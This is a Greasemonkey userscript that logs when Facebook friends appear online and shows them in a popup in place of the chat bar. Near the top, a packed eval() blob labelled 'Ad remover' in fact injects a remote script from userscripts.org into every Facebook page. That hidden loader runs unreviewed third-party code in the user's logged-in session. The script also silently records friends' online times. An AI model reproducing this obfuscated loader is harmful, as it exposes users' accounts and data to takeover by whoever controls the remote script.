// ==UserScript==
// @name           Facebook Online Logger Plus + Last Update
// @namespace      FBOnline
// @include        http://*.facebook.com*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude        http://*.facebook.com/login.php*
// @exclude        http://en-gb.facebook.com/*
// @description     Log out of Facebook Chat and still see who is online.
// @author     http://userscripts.org/users/59449
// @version     3.3
// ==/UserScript==

// Modified version of
// http://userscripts.org/scripts/show/19450
// http://userscripts.org/scripts/show/23499

// Ad remover
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


window.addEventListener("load", function(e) {
	var elements = xpath("//div[contains(@class, 'ad_capsule')] | //div[contains(@class, 'social_ad')] | //div[@id='announce'] | //div[contains(@id, 'sponsor')] | //div[contains(@id, 'ssponsor')]");
	if (elements.snapshotLength > 0) {
		for (var i = 0; i < elements.snapshotLength; i++) {
			var thisElement = elements.snapshotItem(i);
			thisElement.parentNode.removeChild(thisElement);
		}
	}
}, false);
function xpath (query) {
	return document.evaluate(query, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
}

init();
function init() {
	if (!document.body) { window.setTimeout(function(){init();}, 300); }
	if (window != window.top) return;  // Don't run in a frame
	if ($('loginform')) return; // Don't run if not logged in
	MenuCommands();
	if (GM_getValue('ShowPopUp', true)) { createChatMenu(); }
	facebookOnline();
}

function facebookOnline() {
	GM_xmlhttpRequest({
		method:"GET",
		url:"http://iphone.facebook.com/friends.php?v=online",
		headers:{"User-Agent":"Mozilla/5.0","Accept":"text/xml"},
		onload:function(response) {
			if((response.readyState == 4) && (response.status == 200))
				parseResults(response.responseText);
		}
	});

	window.setTimeout(facebookOnline, 60000); // Refresh every 60 seconds
}

function parseResults(temp) {
	var rt = process(temp);

	var uLINK = "";
	var popText = "";
	
	var today = new Date();
	var h = today.getHours();
	if (h<10) h = "0"+h;	
	var m = today.getMinutes();
	if (m<10) m = "0"+m;
	var dd = today.getDate();
	var mm = today.getMonth()+1;
	var yy = today.getFullYear();
	var t = dd+"/"+mm+"/"+yy+" "+h+":"+m;

	var lastchecked = GM_getValue("lastupdated", t);
	
	for (var i=0; i<rt.length;i+=1) {
		var uID = getUID(rt[i]);
		var uNAME = getUName(rt[i]);
	
		var a = GM_getValue(uID,uNAME+","+t+","+t);
		var b = a.split(",");
		var c;
	
		if (lastchecked == b[2]) {
			c = b[1].split(" ");
			GM_setValue(uID,uNAME+","+b[1]+","+t);  //was online
		}
		else {
			c = t.split(" ");
			GM_setValue(uID,uNAME+","+t+","+t);  //now online
		}
		
		if (GM_getValue('ShowTime', true)) {
			uLINK = c[1] + ' <a href="http://www.facebook.com/profile.php?id='+uID+'">'+uNAME+'</a>';	
		}
		else {
			uLINK = '<a href="http://www.facebook.com/profile.php?id='+uID+'">'+uNAME+'</a>';
		}
		
		popText += '<div id="fbmLINK">'+uLINK+'</div>'; // For popup menu - add hh:mm here
	}

	if (GM_getValue('ShowPopUp', true)) { updatePopUp(popText,rt.length); } // Popup menu in place of chat
	
	GM_setValue("lastupdated", t);
}

// Adds the online friends list on top of the Facebook Chat bar
function createChatMenu (){
	var onshow = GM_getValue('ShowHide', false);
	if (onshow != true && onshow != false) { 
		onshow = false;
		GM_setValue('ShowHide', onshow); 
	}

	GM_addStyle(
		'#fbmDIV { bottom:-1px !important; right:75px !important; min-width:170px; border:1px solid #b5b5b5; background:#e5e5e5; position:fixed !important; z-index:99999 !important; padding:0px; }'+
		'#fbmHEAD { color:black; font-size:11px; padding:5px 6px 5px 6px; height:14px; min-width: 112px; padding-left: 21px; background-image: url(http://static.ak.fbcdn.net/images/presence/buddy_list.gif); background-repeat: no-repeat; background-position: 4px 6px; white-space: nowrap;}'+
		'#fbmHEAD:hover { cursor:pointer; }'+
		'#fbmEXIT { color:#6D84B4; float:right; font-weight:bold; padding:5px 6px 5px 6px; vertical-align:top; }'+
		'#fbmEXIT:hover { cursor:pointer; color:#3B5998; }'+
		'#fbmBODY { background-color:white; border-bottom:1px solid #b5b5b5; }'+
		'#fbmLINK { padding:4px 8px 4px 8px; }'+
		'#fbmNUM { font-weight:bold; }'
	);
	if (!onshow) { GM_addStyle('#fbmBODY {display: none;}'); }

	// Create new friends menu
	var div = document.createElement('div');
	div.id = 'fbmDIV';
	div.innerHTML = '<div id="fbmBODY"><div id="fbmLINK">Loading...</div></div><div id="fbmEXIT" title="Close">x</div><div id="fbmHEAD">Online Friends (<span id="fbmNUM">0</span>)</div>';
	document.body.appendChild(div);

	// Listen for clicks on the x and make the list disappear and stop updating
	$('fbmEXIT').addEventListener('click', function() { 
		$('fbmDIV').style.display='none';
	}, false);
	// Listen for clicks on the header and hide/show the list of friends
	$('fbmHEAD').addEventListener('click', function() {
		if (onshow) { $('fbmBODY').style.display='none'; onshow = false; }
		else { $('fbmBODY').style.display='block'; onshow = true; }
		GM_setValue('ShowHide',onshow);
	}, false);
}

// Updates the online friend list on top of Facebook Chat
function updatePopUp (temp,num) {
	if (temp == "") { temp = '<div id="fbmLINK">No online friends.</div>'; }
	if ($('fbmNUM')) { $('fbmNUM').innerHTML = num; }
	if ($('fbmBODY')) { $('fbmBODY').innerHTML = temp; }
}

function $(id) { return document.getElementById(id); }
function getUID(rawt) {	return rawt.substring(0, rawt.indexOf('"')); }
function getUName(rawt) { return rawt.substring(rawt.indexOf('.jpg"></div>')+12, rawt.length); }

function process(response) {
	var result = new Array();
	var res = response;
	var i = 0;
	var indexd, indexu;
	
	while(res.indexOf('profile.php?id=') > 0) {
		res = res.substring(res.indexOf('profile.php?id=')+15, res.length);
		indexd = res.indexOf('<div class="listCaption2');
		indexu = res.indexOf('</u>');
		if ((indexd == -1) || (indexu < indexd)) { result[i] = res.substring(0, indexu); }
		else { result[i] = res.substring(0, indexd); }
		i++;
	}
	
	return result;
}

// User Script Commands in Greasemonkey
function MenuCommands (){
	GM_registerMenuCommand('FBOnline: Show/Hide PopUp Friends', function(){
		if ((GM_getValue('ShowPopUp', true)) && (confirm('Hide online friends in place of Facebook Chat?'))) {
			GM_setValue('ShowPopUp', false);
		}
		else if ((!GM_getValue('ShowPopUp', true)) && (confirm('Show online friends in place of Facebook Chat?'))) {
			GM_setValue('ShowPopUp', true);
		}
	});
	GM_registerMenuCommand('FBOnline: Show/Hide Time', function(){
		if ((GM_getValue('ShowTime', true)) && (confirm('Hide Time next to friend?'))) {
			GM_setValue('ShowTime', false);
		}
		else if ((!GM_getValue('ShowTime', true)) && (confirm('Show Time next to friend?'))) {
			GM_setValue('ShowTime', true);
		}
	});
}